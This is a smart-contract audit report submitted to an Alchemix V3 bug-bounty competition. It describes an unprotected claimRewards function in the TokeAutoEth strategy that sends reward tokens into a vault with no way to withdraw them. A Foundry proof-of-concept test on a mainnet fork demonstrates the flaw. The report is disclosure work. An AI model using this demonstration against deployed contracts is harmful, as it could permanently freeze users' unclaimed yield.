# 57982 sc low permanently stuck rewards in the vault

**Submitted on Oct 29th 2025 at 19:28:37 UTC by @Cyborg for** [**Audit Comp | Alchemix V3**](https://immunefi.com/audit-competition/alchemix-v3-audit-competition)

* **Report ID:** #57982
* **Report Type:** Smart Contract
* **Report severity:** Low
* **Target:** <https://github.com/alchemix-finance/v3-poc/blob/immunefi\\_audit/src/strategies/mainnet/TokeAutoEth.sol>
* **Impacts:**
  * Permanent freezing of funds
  * Permanent freezing of unclaimed yield

## Description

## Brief/Intro

Permanently stuck rewards in the Vault due to missing logic of withdrawing.

## Vulnerability Details

When the Vault requests the `allocate` method inside **TokeAutoEth.sol** contract *( **TokeAutoEth.sol** contract inherits method `allocate` from parent contract **MYTStrategy.sol**)* what happens is that the strategy is staking the passed amount to the Tokenmak Rewarder contract. The concept of this rewarder contract is to generate rewards by the time passing for all stakers based on their deposits. Once there is pending reward to be claimed then the strategy can request the `rewarder.getReward` method to claim the rewards. There are 2 problems here:

1. The `TokeAutoEth` strategy's method `claimRewards` lacks of access control validation meaning anyone can call it.
2. The `rewarder.getReward` request initiated inside method `claimRewards` is actually claiming the rewards directly to the Vault and the Vault has no logic to withdraw or rescue token funds. The received rewardToken is different than the `vault.asset()` thus cannot be used to be re-allocated back to some strategy.

## Impact Details

Permanently stuck funds in the form of rewards received by the Tokemak's Rewarder contract.

## Recommendation

1. Consider adding access control validation to method `claimRewards` inside *src/MYTStrategy.sol*
2. The rewards are claimed directly to the Morpho Vault V2, but the reward token type is different from the vault's `asset()`. Introduce new logic where rewards are claimed to the owner of the strategy or dedicated rewards collector.

## Proof of Concept

## Proof of Concept

Create file `src/test/strategies/TokeAutoETHStrategy.claimRewards.t.sol` and run it with command `forge test src/test/strategies/TokeAutoETHStrategy.claimRewards.t.sol -vv`:

```
// SPDX-License-Identifier: MIT
pragma solidity 0.8.28;
// Adjust these imports to your layout

import "forge-std/Test.sol";
import {IVaultV2} from "lib/vault-v2/src/interfaces/IVaultV2.sol";
import {TokeAutoEthStrategy} from "src/strategies/mainnet/TokeAutoEth.sol";
import {BaseStrategyTest} from "../libraries/BaseStrategyTest.sol";
import {IMYTStrategy} from "../../interfaces/IMYTStrategy.sol";
import {IMainRewarder, IAutopilotRouter} from "src/strategies/interfaces/ITokemac.sol";

interface IERC20 {
    function approve(address spender, uint256 amount) external returns (bool);
    function balanceOf(address a) external view returns (uint256);
}

interface ITokeAutoEthStrategy {
    function rewarder() external returns (address);
    function claimRewards() external returns (uint256);
}

interface IMainRewarder2 {
    function rewardPerTokenStored() external returns (uint256);
}

contract MockTokeAutoEthStrategy is TokeAutoEthStrategy {
    constructor(
        address _myt,
        StrategyParams memory _params,
        address _autoEth,
        address _router,
        address _rewarder,
        address _weth,
        address _oracle,
        address _permit2Address
    ) TokeAutoEthStrategy(_myt, _params, _autoEth, _router, _rewarder, _weth, _oracle, _permit2Address) {}
}

contract TokeAutoETHStrategyTest is BaseStrategyTest {
    address public constant TOKE_AUTO_ETH_VAULT = 0x0A2b94F6871c1D7A32Fe58E1ab5e6deA2f114E56;
    address public constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address public constant MAINNET_PERMIT2 = 0x000000000022d473030f1dF7Fa9381e04776c7c5;
    address public constant AUTOPILOT_ROUTER = 0x37dD409f5e98aB4f151F4259Ea0CC13e97e8aE21;
    address public constant REWARDER = 0x60882D6f70857606Cdd37729ccCe882015d1755E;
    address public constant ORACLE = 0x61F8BE7FD721e80C0249829eaE6f0DAf21bc2CaC;
    address public staker = address(0x123);

    function getStrategyConfig() internal pure override returns (IMYTStrategy.StrategyParams memory) {
        return IMYTStrategy.StrategyParams({
            owner: address(1),
            name: "TokeAutoEth",
            protocol: "TokeAutoEth",
            riskClass: IMYTStrategy.RiskClass.MEDIUM,
            cap: 10_000e18,
            globalCap: 1e18,
            estimatedYield: 100e18,
            additionalIncentives: false,
            slippageBPS: 1
        });
    }

    function getTestConfig() internal pure override returns (TestConfig memory) {
        return TestConfig({vaultAsset: WETH, vaultInitialDeposit: 1000e18, absoluteCap: 10_000e18, relativeCap: 1e18, decimals: 18});
    }

    function createStrategy(address vault, IMYTStrategy.StrategyParams memory params) internal override returns (address) {
        return address(new MockTokeAutoEthStrategy(vault, params, TOKE_AUTO_ETH_VAULT, AUTOPILOT_ROUTER, REWARDER, WETH, ORACLE, MAINNET_PERMIT2));
    }

    function getForkBlockNumber() internal pure override returns (uint256) {
        return 22_089_302;
    }

    function getRpcUrl() internal view override returns (string memory) {
        return vm.envString("MAINNET_RPC_URL");
    }

    // Add any strategy-specific tests here
    function test_strategy_deallocate_reverts_due_to_slippage() public {
        vm.startPrank(vault);
        uint256 amountToAllocate = 100000 * 10 ** 18;
        deal(testConfig.vaultAsset, strategy, amountToAllocate);

        address rewarder = ITokeAutoEthStrategy(strategy).rewarder();

        /// staking to the REWARDER contract through the TokeAutoEthStrategy's allocate method
        bytes memory prevAllocationAmount = abi.encode(0);
        IMYTStrategy(strategy).allocate(prevAllocationAmount, amountToAllocate, "", address(0));
        uint256 initialRealAssets = IMYTStrategy(strategy).realAssets();
        require(initialRealAssets > 0, "Initial real assets is 0");

        /// increasing rewards for stakers
        bytes32 slot = bytes32(uint256(3)); // storage slot index of REWARDER contract rewardPerTokenStored
        bytes32 newValue = bytes32(uint256(IMainRewarder2(rewarder).rewardPerTokenStored() * 2)); // new slippage value
        vm.store(rewarder, slot, newValue);

        /// granting the REWARDER contract with rewardTokens amount
        address rewardToken = IMainRewarder(rewarder).rewardToken();
        deal(rewardToken, rewarder, type(uint256).max);
  
        require(IERC20(rewardToken).balanceOf(address(vault)) == 0);
        require(IMainRewarder(rewarder).earned(address(strategy)) != 0, "ERROR: earned returning 0");

        /// claiming the rewards from the REWARDER contract to the vault
        ITokeAutoEthStrategy(strategy).claimRewards(); /// !!!! this method has no access control, anyone can claim the rewards !!!!
        
        require(IERC20(rewardToken).balanceOf(address(vault)) > 0, "ERROR: vault balance not increased");
        require(IMainRewarder(rewarder).earned(address(strategy)) == 0, "ERROR: earned still not 0");

        console.log(rewardToken, 'rewardToken');
        console.log(IVaultV2(vault).asset(), 'vault.asset()');

        /// At this point the reward tokens are now in the Vault, but they're stuck permanently as there isn't any method to withdraw them
    }
}
```
